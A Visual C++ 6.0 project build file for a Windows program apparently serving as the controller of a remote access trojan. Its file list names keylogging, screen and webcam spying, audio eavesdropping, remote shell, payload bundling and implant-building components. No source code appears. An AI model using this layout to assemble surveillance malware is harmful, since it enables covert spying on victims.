# Microsoft Developer Studio Project File - Name="Client" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Client - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak" CFG="Client - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Client - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /GX /I "CJ60lib/Include" /I "../common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX"stdafx.h" /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 ToolkitPro1501vc60S.lib ../common/zlib/zlib.lib SHLWAPI.LIB nafxcw.lib /nologo /subsystem:windows /map /machine:I386 /nodefaultlib:"msvcrt.lib" /out:"../Bin/土豪专版.exe"
# SUBTRACT LINK32 /pdb:none /debug /nodefaultlib
# Begin Target

# Name "Client - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\Build.cpp
# End Source File
# Begin Source File

SOURCE=.\ChangeGroup.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.rc
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientView.cpp
# End Source File
# Begin Source File

SOURCE=.\include\CpuUsage.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LOCKDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LogView.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\MsgBox.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Setting.cpp
# End Source File
# Begin Source File

SOURCE=.\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SplashScreenEx.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SysInfo.cpp
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TabView.cpp
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.cpp
# End Source File
# Begin Source File

SOURCE=.\UpdateDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ZXPortMap.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\Build.h
# End Source File
# Begin Source File

SOURCE=.\ChangeGroup.h
# End Source File
# Begin Source File

SOURCE=.\Client.h
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.h
# End Source File
# Begin Source File

SOURCE=.\ClientView.h
# End Source File
# Begin Source File

SOURCE=.\decode.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\LOCKDlg.h
# End Source File
# Begin Source File

SOURCE=.\LogView.h
# End Source File
# Begin Source File

SOURCE=..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\MsgBox.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\Setting.h
# End Source File
# Begin Source File

SOURCE=.\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\SplashScreenEx.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\SysInfo.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\TabView.h
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.h
# End Source File
# Begin Source File

SOURCE=.\UpdateDlg.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=.\ZXPortMap.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=".\res\icos\1-IP.ico"
# End Source File
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=".\res\icos\10-Double.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\2-os.ico"
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=".\res\icos\3-CPU.ico"
# End Source File
# Begin Source File

SOURCE=.\res\3.cur
# End Source File
# Begin Source File

SOURCE=.\res\334.ico
# End Source File
# Begin Source File

SOURCE=".\res\icos\4-Memory.ico"
# End Source File
# Begin Source File

SOURCE=.\res\4.cur
# End Source File
# Begin Source File

SOURCE=".\res\icos\5-disk.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\6-UserName.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\7-Active.ico"
# End Source File
# Begin Source File

SOURCE=".\res\icos\8-Anti.ico"
# End Source File
# Begin Source File

SOURCE=.\res\AppWindows.ico
# End Source File
# Begin Source File

SOURCE=.\res\audio.ico
# End Source File
# Begin Source File

SOURCE=.\res\barnew.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Cam.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.rc2
# End Source File
# Begin Source File

SOURCE=.\res\cmdshell.ico
# End Source File
# Begin Source File

SOURCE=.\res\ddd.bmp
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=.\res\dword.ico
# End Source File
# Begin Source File

SOURCE=.\res\explorer.ico
# End Source File
# Begin Source File

SOURCE=.\res\File.ico
# End Source File
# Begin Source File

SOURCE=.\res\guo\1\icon140.ico
# End Source File
# Begin Source File

SOURCE=.\res\jpgxp.ico
# End Source File
# Begin Source File

SOURCE=.\res\keyboard.ico
# End Source File
# Begin Source File

SOURCE=.\res\new.bmp
# End Source File
# Begin Source File

SOURCE=.\res\NoCam.ico
# End Source File
# Begin Source File

SOURCE=.\res\Process.ico
# End Source File
# Begin Source File

SOURCE=.\res\regedit.ico
# End Source File
# Begin Source File

SOURCE=.\res\regsz.ico
# End Source File
# Begin Source File

SOURCE=.\res\remote.ico
# End Source File
# Begin Source File

SOURCE=.\res\Splash.bmp
# End Source File
# Begin Source File

SOURCE=.\res\TOOLBAR\Splash.bmp
# End Source File
# Begin Source File

SOURCE=.\res\system.ico
# End Source File
# Begin Source File

SOURCE=.\res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\webcam.ico
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\阿尔巴尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\阿尔及利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\阿根廷.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\阿联酋.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\阿塞拜疆.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\埃及.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\爱尔兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\爱沙尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\奥地利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\澳大利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\澳门.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\巴勒斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\巴拿马.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\巴西.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\1\白俄罗斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\保加利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\比利时.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\波兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\超级捆绑.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\超级终端.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\创建客户.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\丹麦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\德国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\俄罗斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\厄瓜多尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\法国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\菲律宾.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\芬兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\服务管理.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\格鲁吉亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\古巴.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\关于程序.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\哈萨克斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\韩国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\荷兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\加拿大.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\柬埔寨.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\键盘记录.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\捷克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\卡塔尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\克罗地亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\老挝.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\黎巴嫩.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\立陶宛.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\卢森堡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\罗马尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\马来西亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\美国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\孟加拉.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\缅甸.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\摩纳哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\3\墨西哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\南非.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\挪威.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\屏幕监控.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\葡萄牙.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\日本.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\瑞典.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\瑞士.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\塞浦路斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\沙特阿拉伯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\视频监控.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\斯洛伐克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\泰国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\土耳其.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\土库曼斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\退出程序.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\委内瑞拉.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\文件管理.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\文件夹1.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\乌克兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\乌拉圭.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\4\乌兹别克斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\西班牙.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\希腊.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\系统管理.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\系统设置.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\香港.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\新加坡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\新西兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\匈牙利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\亚美尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\伊朗.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\以色列.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\意大利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\印度.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\印度尼西亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\英国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\语音监听.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\域名更新.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\约旦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\越南.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\智利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\中非.ico"
# End Source File
# Begin Source File

SOURCE=".\res\guo\中国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\TOOLBAR\注册表.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\guo\2\斐济.ico"
# End Source File
# End Group
# Begin Source File

SOURCE=.\res\guo\aero.she
# End Source File
# Begin Source File

SOURCE=.\ReadMe.txt
# End Source File
# Begin Source File

SOURCE=.\res\xp.xml
# End Source File
# End Target
# End Project
